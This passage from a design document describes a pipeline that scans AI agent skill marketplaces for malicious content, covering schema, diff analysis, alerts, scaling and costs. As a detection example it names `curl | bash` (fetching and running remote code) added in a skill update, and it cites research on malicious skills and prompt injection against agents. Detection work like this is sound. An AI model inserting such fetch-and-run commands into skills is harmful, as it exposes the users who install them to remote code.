    medium_count    INTEGER NOT NULL DEFAULT 0,
    low_count       INTEGER NOT NULL DEFAULT 0,
    info_count      INTEGER NOT NULL DEFAULT 0,
    findings_json   JSONB NOT NULL,    -- Array of ScanFinding objects
    quality_json    JSONB,             -- 6-dimension quality scores
    metadata_json   JSONB,             -- Source-specific metadata
    skipped         BOOLEAN DEFAULT FALSE, -- True if reused from dedup
    scanned_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX idx_scan_results_skill ON scan_results (skill_id, scanned_at DESC);
CREATE INDEX idx_scan_results_hash ON scan_results (content_hash);
CREATE INDEX idx_scan_results_score ON scan_results (security_score);

-- Content snapshots: full SKILL.md content for diff analysis
CREATE TABLE content_snapshots (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    skill_id        UUID NOT NULL REFERENCES skills(id),
    content_hash    TEXT NOT NULL UNIQUE,
    content         TEXT NOT NULL,
    size_bytes      INTEGER NOT NULL,
    captured_at     TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX idx_snapshots_skill ON content_snapshots (skill_id, captured_at DESC);

-- Source discoveries: tracks which sources have seen which skills
CREATE TABLE source_discoveries (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    skill_id        UUID NOT NULL REFERENCES skills(id),
    source          TEXT NOT NULL,
    source_id       TEXT NOT NULL,
    source_url      TEXT NOT NULL,
    first_seen_at   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    last_seen_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    metadata_json   JSONB,             -- Source-specific metadata (e.g., SD grade)
    UNIQUE (skill_id, source, source_id)
);

-- Crawl sessions: tracks adapter crawl runs for resumption
CREATE TABLE crawl_sessions (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    adapter         TEXT NOT NULL,
    status          TEXT NOT NULL DEFAULT 'running',
    cursor          TEXT,               -- Opaque cursor for resumption
    skills_processed INTEGER DEFAULT 0,
    skills_discovered INTEGER DEFAULT 0,
    errors          INTEGER DEFAULT 0,
    started_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    completed_at    TIMESTAMPTZ,
    last_activity_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Alerts: notification queue for critical findings and badge changes
CREATE TABLE alerts (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    skill_id        UUID NOT NULL REFERENCES skills(id),
    scan_result_id  UUID REFERENCES scan_results(id),
    severity        TEXT NOT NULL,      -- 'critical' | 'high' | 'medium' | 'info'
    type            TEXT NOT NULL,      -- 'new-critical-finding' | 'badge-downgrade' | 'content-mutation' | 'rug-pull-detected'
    title           TEXT NOT NULL,
    description     TEXT NOT NULL,
    status          TEXT NOT NULL DEFAULT 'pending', -- 'pending' | 'sent' | 'acknowledged' | 'resolved'
    channels        TEXT[] NOT NULL,    -- ['email', 'webhook', 'dashboard']
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    sent_at         TIMESTAMPTZ,
    acknowledged_at TIMESTAMPTZ
);

CREATE INDEX idx_alerts_pending ON alerts (created_at ASC) WHERE status = 'pending';
CREATE INDEX idx_alerts_skill ON alerts (skill_id);
```

### 5.2 Historical Tracking

Every scan produces an immutable `scan_results` row. This enables:

1. **Trend analysis**: Track how a skill's security score changes over time. A skill that was clean at version N but now triggers critical findings at version N+1 is a rug-pull candidate.
2. **Rule retroactivity**: When detection rules are updated (new rule version), the weekly rescan applies new rules to all skills. Historical results let us show "this skill would have been flagged by today's rules even at its initial version."
3. **Audit trail**: For Tier 3 (human review), reviewers can see the full scan history to understand why a skill was escalated.

### 5.3 Content Snapshots and Diff Analysis

The `content_snapshots` table stores full SKILL.md content at each unique hash. When a skill's content changes (new hash), the pipeline can compute a diff between the old and new snapshots:

```typescript
interface ContentDiff {
  skillId: string;
  previousHash: string;
  currentHash: string;
  additions: string[];     // Lines added
  deletions: string[];     // Lines removed
  riskDelta: {
    newPatterns: ScanFinding[];   // New dangerous patterns introduced
    removedPatterns: ScanFinding[]; // Previously-flagged patterns removed
    scoreChange: number;           // Security score delta
  };
}
```

Diff analysis is particularly valuable for detecting:
- **Rug pulls**: A previously-clean skill adds `curl | bash` in an update
- **Gradual poisoning**: Small changes accumulate to become dangerous over multiple updates
- **Cleanup verification**: A flagged skill removes the dangerous pattern (badge upgrade candidate)

---

## 6. Alert Mechanism

### 6.1 Alert Types and Triggers

| Alert Type | Trigger Condition | Severity | Auto-Action |
|-----------|-------------------|----------|-------------|
| **New Critical Finding** | Tier 1 scan finds critical-severity pattern in a previously-clean skill | Critical | Badge downgrade to "warning" |
| **Badge Downgrade** | Security score drops below tier threshold on rescan | High | Badge status changed, notification sent |
| **Content Mutation** | Content hash changed since last scan (any skill with active badge) | Medium | Trigger immediate rescan |
| **Rug Pull Detected** | Clean skill adds critical patterns in a single update | Critical | Immediate badge revocation, admin notification |
| **Source Removal** | Skill no longer accessible at source URL (deleted/private) | Medium | Badge marked "source-unavailable" |
| **Grade Discrepancy** | Our scan disagrees with SkillsDirectory grade (e.g., we find critical, SD says A) | Info | Log for analysis |

### 6.2 Alert Severity Levels

```typescript
type AlertSeverity = 'critical' | 'high' | 'medium' | 'info';

const SEVERITY_CONFIG: Record<AlertSeverity, SeverityConfig> = {
  critical: {
    autoAction: true,          // Automatically downgrade/revoke badge
    notifyAdmin: true,         // Notify admin dashboard immediately
    notifyAuthor: true,        // Email skill author (if email on file)
    webhook: true,             // Fire webhook to integrators
    escalationTimeout: 0,      // No delay -- act immediately
    requiresHumanReview: true, // Must be reviewed even after auto-action
  },
  high: {
    autoAction: true,
    notifyAdmin: true,
    notifyAuthor: true,
    webhook: true,
    escalationTimeout: 3600000, // 1 hour before escalation
    requiresHumanReview: true,
  },
  medium: {
    autoAction: false,          // Queue for review, no auto-action
    notifyAdmin: false,
    notifyAuthor: false,
    webhook: false,
    escalationTimeout: 86400000, // 24 hours before escalation
    requiresHumanReview: false,
  },
  info: {
    autoAction: false,
    notifyAdmin: false,
    notifyAuthor: false,
    webhook: false,
    escalationTimeout: null,     // No escalation
    requiresHumanReview: false,
  },
};
```

### 6.3 Notification Channels

**Email (via Resend)**: Primary channel for skill authors and admin team.
- Skill authors receive an email when their skill's badge status changes
- Admin team receives a daily digest of critical/high alerts
- Individual critical alerts are sent immediately (not batched)

**Webhook**: For integrators who display verified-skill.com badges.
- POST to registered webhook URLs when badge status changes
- Payload includes skill ID, old status, new status, reason, scan summary
- Retry 3x with exponential backoff on delivery failure

**Dashboard**: Real-time display in the admin dashboard.
- Alert queue with filtering by severity, type, status
- One-click acknowledge/resolve workflow
- Links to full scan results and content diffs

```typescript
interface AlertPayload {
  alertId: string;
  skillId: string;
  skillName: string;
  author: string;
  type: string;
  severity: AlertSeverity;
  title: string;
  description: string;
  previousBadge: string;
  newBadge: string;
  scanSummary: {
    criticalFindings: number;
    highFindings: number;
    scoreChange: number;
    contentChanged: boolean;
  };
  actionTaken: string;    // 'badge-downgraded' | 'badge-revoked' | 'queued-for-review'
  timestamp: string;
}
```

### 6.4 Badge Downgrade Flow

```
Content Change Detected
    ↓
Immediate Rescan (priority: 85)
    ↓
Compare new findings vs. previous scan
    ↓
┌─────────────────────────────────┐
│ New critical finding?           │
│   YES → Badge → "warning"      │──→ Alert: critical
│         Revoke if malicious     │──→ Admin notification
│   NO  → Score decreased?        │
│     YES → Badge → lower tier    │──→ Alert: high
│     NO  → Badge unchanged       │──→ No alert
└─────────────────────────────────┘
```

---

## 7. Scalability Considerations

### 7.1 Launch Capacity (500+ submissions/day)

At launch, the pipeline must handle:
- **500 new submissions/day** (on-demand scans)
- **200 top-100 rescans/day** (critical tier, every 6 hours = 4 runs x ~50 changed)
- **~5,000 weekly rescan jobs** (5% change rate on initial catalog)

**Total daily throughput needed**: ~700 scans/day (launch), growing to ~5,000 scans/day (weekly rescan peaks).

**Pipeline capacity at default settings**: 172,800 scans/day (with content fetch). This provides a **246x safety margin** over launch requirements.

### 7.2 Horizontal Scaling

Cloudflare Queues handle scaling automatically:

1. **Launch**: Single queue, single consumer Worker. Cloudflare auto-scales consumer instances based on queue depth.
2. **Growth**: Multiple queues by priority (critical, standard, backfill). Each queue has independent consumer scaling.
3. **Scale**: 5,000 messages/second per queue. Add queues to partition by source or priority.

No manual instance management needed. Cloudflare's serverless model handles all scaling automatically.

### 7.3 Content Caching

To reduce GitHub API calls and fetch latency:

1. **Conditional requests**: Use `If-None-Match` with ETags for GitHub API calls. If content has not changed, GitHub returns 304 with zero body (does not count against quota per GitHub documentation).
2. **Content snapshot cache**: The `content_snapshots` table doubles as a cache. If we have a snapshot with a matching hash, we do not need to re-fetch content from the source.
3. **CDN caching**: For Skills.sh and SkillsMP, cache fetched pages for 1 hour (they update infrequently).
4. **Git tree SHA comparison**: For GitHub-hosted skills, compare the tree SHA via API (lightweight) before fetching full content (heavy). This is the same mechanism used by the `skills` CLI's update checker.

### 7.4 Estimated Costs

| Resource | Provider | Monthly Cost | Notes |
|---------|----------|-------------|-------|
| **PostgreSQL** | Neon (free tier) → Neon Pro | $0 - $19/mo | Free tier: 0.5 GB storage, auto-suspend. Pro: 10 GB, always-on. |
| **Compute (workers)** | Cloudflare Workers | $0 - $5/mo | Free: 100K requests/day. Paid: $5/mo for 10M requests. |
| **Cloudflare Queues** | Cloudflare | $0 | Free: 10K ops/day. Paid: $0.40/M ops after 1M/month included. |
| **Workers AI (Tier 2)** | Cloudflare | $0 - $45/mo | Free: ~10K neurons/day. At 500 scans/day: ~$45/month. |
| **GitHub API** | Free (PAT) | $0 | 5,000 req/hr per token. 2-3 tokens = no cost. |
| **Resend (email)** | Free tier → Growth | $0 - $20/mo | Free: 100 emails/day. Growth: 50K emails/mo. |
| **Content storage** | PostgreSQL (included) | $0 | 36K skills x 10KB avg = 360 MB. Fits in Neon Pro. |
| **Total (launch)** | | **$0 - $45/mo** | Free tier covers everything except Workers AI at scale. |
| **Total (scale: 200K skills)** | | **~$65 - $100/mo** | Larger DB + Workers AI at scale. No instance management. |

### 7.5 Growth Projections

| Metric | Launch (Month 1) | Month 3 | Month 6 | Month 12 |
|--------|------------------|---------|---------|----------|
| Skills indexed | 5,000 | 25,000 | 75,000 | 200,000+ |
| Daily submissions | 500 | 1,000 | 2,000 | 5,000 |
| Scans/day (peak) | 5,000 | 30,000 | 80,000 | 200,000 |
| DB size | 500 MB | 2 GB | 5 GB | 15 GB |
| Worker instances | 1 | 1-2 | 2-3 | 3-5 |

The Cloudflare-native architecture handles all of these projections without architectural changes. Scaling is automatic — no manual instance management needed.

---

## 8. Architecture Diagram

```mermaid
flowchart TB
    subgraph Sources["Source Platforms"]
        SSH["Skills.sh\n200+ skills\n234K top installs"]
        CH["ClawHub\n3,286+ skills\n76 malicious payloads"]
        GH["GitHub\n44K+ SKILL.md files\nAwesome lists"]
        SMP["SkillsMP\n200K+ skills\nAggregator"]
        SD["SkillsDirectory\n36K skills\n50+ rules, A-F grades"]
    end

    subgraph Adapters["Source Adapters"]
        A1["Skills.sh\nAdapter"]
        A2["ClawHub\nAdapter"]
        A3["GitHub\nAdapter"]
        A4["SkillsMP\nAdapter"]
        A5["SkillsDirectory\nAdapter"]
    end

    subgraph Scheduler["Crawl Scheduler"]
        CRIT["Critical\nEvery 6h\nTop 100 skills"]
        DAILY["Daily\n02:00 UTC\nNew + reported"]
        WEEKLY["Weekly\nSun 04:00 UTC\nFull rescan"]
        ONDEM["On-Demand\nImmediate\nSubmissions + reports"]
    end

    subgraph Pipeline["Scanning Pipeline"]
        QUEUE["Cloudflare Queues\nPush-based delivery\nPriority queues"]
        W1["Worker 1"]
        W2["Worker 2"]
        WN["Worker N"]

        subgraph ScanProcess["Scan Process"]
            DEDUP["Deduplicate\nSHA-256 hash check"]
            T1["Tier 1: Static\n26+ patterns\n7 categories"]
            SCORE["Score\nSecurity 0-5\nQuality 0-30"]
            DIFF["Diff Analysis\nContent snapshot\nMutation detection"]
        end
    end

    subgraph Storage["PostgreSQL Storage"]
        SKILLS[("skills\nCanonical records")]
        RESULTS[("scan_results\nHistorical scans")]
        SNAPS[("content_snapshots\nFull SKILL.md")]
        ALERTS_T[("alerts\nNotification queue")]
    end

    subgraph AlertSystem["Alert System"]
        BADGE["Badge Engine\nDowngrade / Revoke"]
        EMAIL["Resend\nEmail notifications"]
        HOOK["Webhooks\nIntegrator callbacks"]
        DASH["Admin Dashboard\nReal-time queue"]
    end

    SSH --> A1
    CH --> A2
    GH --> A3
    SMP --> A4
    SD --> A5

    A1 --> QUEUE
    A2 --> QUEUE
    A3 --> QUEUE
    A4 --> QUEUE
    A5 --> QUEUE

    CRIT --> QUEUE
    DAILY --> QUEUE
    WEEKLY --> QUEUE
    ONDEM --> QUEUE

    QUEUE --> W1
    QUEUE --> W2
    QUEUE --> WN

    W1 --> DEDUP
    W2 --> DEDUP
    WN --> DEDUP

    DEDUP -->|"Changed"| T1
    DEDUP -->|"Unchanged"| RESULTS
    T1 --> SCORE
    SCORE --> DIFF
    DIFF --> RESULTS
    DIFF --> SNAPS

    RESULTS --> SKILLS
    RESULTS -->|"Critical/High"| ALERTS_T

    ALERTS_T --> BADGE
    ALERTS_T --> EMAIL
    ALERTS_T --> HOOK
    ALERTS_T --> DASH

    style SSH fill:#fee,stroke:#c00
    style CH fill:#fee,stroke:#c00
    style GH fill:#ffe,stroke:#cc0
    style SMP fill:#ffe,stroke:#cc0
    style SD fill:#efe,stroke:#0a0
```

### 8.2 Scan Job Lifecycle

```mermaid
stateDiagram-v2
    [*] --> pending: Job created by\nadapter or scheduler
    pending --> processing: Worker receives\n(Queues push)
    processing --> completed: Scan succeeded\nResults stored
    processing --> failed: Error occurred\n(attempt < max)
    failed --> pending: Retry with\nexponential backoff
    failed --> dead: Max attempts\nexhausted
    processing --> skipped: Content unchanged\n(dedup hit)
    completed --> [*]
    skipped --> [*]
    dead --> [*]: Manual review\nrequired
```

### 8.3 Badge Lifecycle

```mermaid
stateDiagram-v2
    [*] --> none: Skill discovered
    none --> scanned: Tier 1 scan\ncompleted
    scanned --> verified: Tier 2 (LLM)\npassed
    verified --> certified: Tier 3 (human)\napproved
    scanned --> warning: Critical finding\non rescan
    verified --> warning: Critical finding\non rescan
    certified --> warning: Critical finding\non rescan
    warning --> revoked: Confirmed\nmalicious
    warning --> scanned: Finding resolved\n(re-verified)
    revoked --> [*]: Permanent
    scanned --> none: Source removed\nor inaccessible
```

---

## 9. Relationship to Other Design Documents

This scanning pipeline design feeds into and depends on several other T-011 deliverables:

| Document | Relationship |
|----------|-------------|
| **T-008: Three-tier certification** | Pipeline implements Tier 1 (static). Tier 2 (LLM) and Tier 3 (human) are downstream consumers of pipeline results. |
| **T-009: Trust labels and badges** | Badge engine (Section 6.4) manages label transitions based on scan results. |
| **T-015c: Version-pinned verification** | Content snapshots (Section 5.3) provide the diff analysis needed for version-pinned badges. |
| **T-029: Submission state machine** | New submissions enter the pipeline via the on-demand tier. The state machine drives job creation. |
| **T-030: Database schema** | The schema in Section 5.1 is a subset of the full database schema. It will be merged into the canonical Prisma schema. |
| **T-036: Email notification system** | Alert mechanism (Section 6.3) uses Resend for email delivery. Templates and triggers align with the email system design. |

---

## References

### Security Research
- [Snyk ToxicSkills Study](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/) -- 36.82% flaw rate, 76 malicious payloads, 8 still live
- [Snyk: Why Your Skill Scanner Is Just False Security](https://snyk.io/blog/skill-scanner-false-security/) -- Fundamental limitations of pattern-based scanning
- [Snyk: SKILL.md to Shell Access in Three Lines](https://snyk.io/articles/skill-md-shell-access/) -- Attack vector documentation
- [UK NCSC: Prompt Injection Is Not SQL Injection](https://www.ncsc.gov.uk/blog-post/prompt-injection-is-not-sql-injection) -- May never be fully mitigated

### Platforms
- [Skills.sh](https://skills.sh/) -- 200+ skills, zero scanning, top skill 234K installs
- [ClawHub](https://clawhub.ai/) -- 3,286+ skills, VirusTotal added reactively
- [SkillsMP](https://skillsmp.com/) -- 200K+ skills, no scanning
- [SkillsDirectory](https://www.skillsdirectory.com/) -- 36K skills, 50+ rules, 94.4% Grade-A
- [AgentSkill.sh](https://agentskill.sh/) -- 44K+ GitHub skills indexed

### Related Research (This Increment)
- [Platform Security Postures](./platform-security-postures.md) -- Full platform-by-platform analysis
- [Competitive Analysis](./competitive-analysis.md) -- Feature comparison matrix, gap analysis
- [Skill Discovery Sources](./skill-discovery-sources.md) -- 8 sources cataloged, quality rubric
- [SpecWeave Security Audit](./specweave-security-audit.md) -- 26-pattern scanner, integration gaps
- [Skills.sh Installer Internals](./skills-sh-installer-internals.md) -- 39-agent detection, lock file mechanics
